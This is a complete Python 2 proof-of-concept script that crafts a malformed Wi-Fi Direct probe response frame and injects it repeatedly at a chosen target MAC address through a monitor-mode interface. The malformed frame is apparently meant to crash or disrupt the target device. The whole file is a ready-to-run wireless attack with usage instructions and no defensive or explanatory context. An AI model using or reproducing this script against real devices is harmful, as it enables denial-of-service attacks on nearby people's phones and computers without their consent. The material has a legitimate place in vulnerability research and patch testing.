#!/usr/bin/env python

    import sys
    import time
    import struct
    import PyLorcon2


    def get_probe_response(source, destination, channel):
        frame = str()
        frame += "\x50\x00"  # Frame Control
        frame += "\x00\x00"  # Duration
        frame += destination
        frame += source
        frame += source
        frame += "\x00\x00"  # Sequence Control
        frame += "\x00\x00\x00\x00\x00\x00\x00\x00"  # Timestamp
        frame += "\x64\x00"  # Beacon Interval
        frame += "\x30\x04"  # Capabilities Information

        # SSID IE
        frame += "\x00"
        frame += "\x07"
        frame += "DIRECT-"

        # Supported Rates
        frame += "\x01"
        frame += "\x08"
        frame += "\x8C\x12\x98\x24\xB0\x48\x60\x6C"

        # DS Parameter Set
        frame += "\x03"
        frame += "\x01"
        frame += struct.pack("B", channel)

        # P2P
        frame += "\xDD"
        frame += "\x27"
        frame += "\x50\x6F\x9A"
        frame += "\x09"
        # P2P Capabilities
        frame += "\x02" # ID
        frame += "\x02\x00" # Length
        frame += "\x21\x00"
        # P2P Device Info
        frame += "\x0D" # ID
        frame += "\x1B\x00" # Length
        frame += source
        frame += "\x01\x88"
        frame += "\x00\x0A\x00\x50\xF2\x04\x00\x05"
        frame += "\x00"
        frame += "\x10\x11"
        frame += "\x00\x06"
        frame += "fafa\xFA\xFA"

        return frame


    def str_to_mac(address):
        return "".join(map(lambda i: chr(int(i, 16)), address.split(":")))


    if __name__ == "__main__":
        if len(sys.argv) != 3:
            print "Usage:"
            print "  poc.py <iface> <target>"
            print "Example:"
            print "  poc.py wlan0 00:11:22:33:44:55"
            sys.exit(-1)

        iface = sys.argv[1]
        destination = str_to_mac(sys.argv[2])

        context = PyLorcon2.Context(iface)
        context.open_injmon()

        channel = 1
        source = str_to_mac("00:11:22:33:44:55")
        frame = get_probe_response(source, destination, channel)

        print "Injecting PoC."
        for i in range(100):
            context.send_bytes(frame)
            time.sleep(0.100)
